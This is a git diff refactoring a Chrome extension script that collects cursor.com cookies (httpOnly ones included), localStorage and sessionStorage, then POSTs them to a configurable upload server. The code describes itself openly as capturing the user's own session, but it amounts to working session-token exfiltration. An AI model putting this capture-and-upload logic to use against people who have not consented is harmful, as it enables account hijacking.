@@ -27,8 +27,54 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   }
 });
 
-// Default upload URL 
+// Default upload URL
 const DEFAULT_UPLOAD_URL = 'http://192.168.0.1:3000/api/auth/upload-session';
+
+async function resolveUploadUrl() {
+  const { uploadUrl } = await chrome.storage.local.get(['uploadUrl']);
+  return uploadUrl || DEFAULT_UPLOAD_URL;
+}
+
+async function performCapture({ requireAuth } = { requireAuth: false }) {
+  const authProbe = await probeCursorAuthInTab();
+
+  if (requireAuth && (!authProbe || !authProbe.ok)) {
+    const reason = authProbe ? authProbe.reason : 'unknown';
+    throw new Error(
+      'Not authenticated — please open https://cursor.com/dashboard and log in. (' + reason + ')'
+    );
+  }
+
+  const { cookies, storage } = await captureSessionData();
+
+  if (!cookies.length) {
+    if (requireAuth) {
+      throw new Error('No Cursor session found. Please ensure you are logged in to Cursor.');
+    }
+    console.warn('performCapture: no cookies found for cursor.com');
+  }
+
+  console.log(
+    'Captured cookies (summary):',
+    cookies.map(c => ({ name: c.name, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure }))
+  );
+
+  const timestamp = new Date().toISOString();
+
+  return {
+    authProbe,
+    cookies,
+    localStorage: storage.localStorage,
+    sessionStorage: storage.sessionStorage,
+    timestamp,
+    sessionData: {
+      cookies,
+      localStorage: storage.localStorage,
+      sessionStorage: storage.sessionStorage,
+      timestamp,
+    },
+  };
+}
 
 /**
  * Capture the user's Cursor session and upload it to the configured server.
@@ -45,68 +91,40 @@ const DEFAULT_UPLOAD_URL = 'http://192.168.0.1:3000/api/auth/upload-session';
 async function captureCursorSession() {
   try {
     console.log('Starting session capture...');
-		// Gate A: ensure the session in the browser is actually authenticated by
-		// probing /api/usage-summary inside a cursor.com page (first-party cookies).
-		const preProbe = await probeCursorAuthInTab();
-		if (!preProbe || !preProbe.ok) {
-			const reason = preProbe ? preProbe.reason : 'unknown';
-			throw new Error('Not authenticated — please open https://cursor.com/dashboard and log in. (' + reason + ')');
-		}
-    // Capture cookies, tabs and storage (shared helper)
-    const { cookies, tabs, storage } = await captureSessionData();
+    const capture = await performCapture({ requireAuth: true });
 
-    console.log('Cookies found:', cookies.length);
-    console.log('Cookie details:', cookies.map(cookie => ({ name: cookie.name, domain: cookie.domain, path: cookie.path })));
-
-    // Detailed upload URL logging
-    const { uploadUrl, useCustomUploadUrl } = await chrome.storage.local.get(['uploadUrl', 'useCustomUploadUrl']);
-    const finalUploadUrl = uploadUrl || DEFAULT_UPLOAD_URL;
+    const finalUploadUrl = await resolveUploadUrl();
     console.log('Final Upload URL:', finalUploadUrl);
-    console.log('Using custom upload URL:', useCustomUploadUrl);
 
     if (!finalUploadUrl) {
       throw new Error('Extension not configured');
     }
 
-    // Basic validation
-    if (!cookies.length) {
-      throw new Error('No Cursor session found. Please ensure you are logged in to Cursor.');
+    console.log('Preparing to upload session data to:', finalUploadUrl);
+    console.log(
+      'Session data payload size:',
+      JSON.stringify(capture.sessionData).length,
+      'characters'
+    );
+
+    const response = await fetch(finalUploadUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ sessionData: capture.sessionData })
+    });
+
+    console.log('Fetch response status:', response.status);
+    console.log('Fetch response headers:', Object.fromEntries(response.headers.entries()));
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('Server error response:', errorText);
+      throw new Error(`Upload failed: ${errorText}`);
     }
 
-    // Prepare the session data
-    const sessionData = { cookies, localStorage: storage.localStorage, sessionStorage: storage.sessionStorage, timestamp: new Date().toISOString() };
-
-    // Detailed fetch logging
-    try {
-      console.log('Preparing to upload session data to:', finalUploadUrl);
-      console.log('Session data payload size:', JSON.stringify(sessionData).length, 'characters');
-
-      const response = await fetch(finalUploadUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ sessionData })
-      });
-
-      console.log('Fetch response status:', response.status);
-      console.log('Fetch response headers:', Object.fromEntries(response.headers.entries()));
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error('Server error response:', errorText);
-        throw new Error(`Upload failed: ${errorText}`);
-      }
-
-      return { success: true };
-    } catch (fetchError) {
-      console.error('Fetch error details:', {
-        message: fetchError.message,
-        name: fetchError.name,
-        stack: fetchError.stack
-      });
-      throw fetchError;
-    }
+    return { success: true };
   } catch (error) {
     console.error('Detailed capture error:', {
       message: error.message,
@@ -117,7 +135,7 @@ async function captureCursorSession() {
   }
 }
 
-// Helper: capture cookies, tabs and storage (local/session) for cursor.com
+// Helper: capture cookies and storage (local/session) for cursor.com
 async function captureSessionData() {
   const domains = ['cursor.com', '.cursor.com'];
   const cookies = (await Promise.all(domains.map(d => chrome.cookies.getAll({ domain: d })))).flat();
@@ -149,7 +167,7 @@ async function captureSessionData() {
     }
   }
 
-  return { cookies, tabs, storage };
+  return { cookies, storage };
 }
 
 async function getOrOpenCursorTab() {
@@ -259,55 +277,15 @@ async function probeCursorAuthInTab() {
  * Returns `{ cookies, localStorage, sessionStorage, authProbe, timestamp }`.
  */
 async function captureAndVerifyCursor() {
-  // Reuse capture logic but do not upload here — just return results
   console.log('Starting captureAndVerifyCursor...');
-
-  const domains = [
-    'cursor.com', '.cursor.com'
-  ];
-
-  const cookies = (await Promise.all(
-    domains.map(d => chrome.cookies.getAll({ domain: d }))
-  )).flat();
-
-  console.log('Captured cookies (summary):', cookies.map(c => ({ name: c.name, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure })));
-
-  // Attempt to get a cursor.com tab to extract localStorage/sessionStorage
-  const tabs = await chrome.tabs.query({ url: ['https://cursor.com/*', 'https://*.cursor.com/*'] });
-  let storage = { localStorage: {}, sessionStorage: {} };
-
-  if (tabs.length > 0) {
-    try {
-      const results = await chrome.scripting.executeScript({
-        target: { tabId: tabs[0].id },
-        func: () => {
-          const data = { localStorage: {}, sessionStorage: {} };
-          for (let i = 0; i < window.localStorage.length; i++) {
-            const key = window.localStorage.key(i);
-            data.localStorage[key] = window.localStorage.getItem(key);
-          }
-          for (let i = 0; i < window.sessionStorage.length; i++) {
-            const key = window.sessionStorage.key(i);
-            data.sessionStorage[key] = window.sessionStorage.getItem(key);
-          }
-          return data;
-        }
-      });
-
-      if (results && results[0]) storage = results[0].result;
-    } catch (err) {
-      console.warn('Failed to extract storage via scripting.executeScript:', err.message);
-    }
-  }
-
-	const probe = await probeCursorAuthInTab();
+  const capture = await performCapture();
 
   return {
-    cookies,
-    localStorage: storage.localStorage,
-    sessionStorage: storage.sessionStorage,
-    authProbe: probe,
-    timestamp: new Date().toISOString()
+    cookies: capture.cookies,
+    localStorage: capture.localStorage,
+    sessionStorage: capture.sessionStorage,
+    authProbe: capture.authProbe,
+    timestamp: capture.timestamp,
   };
 }
 
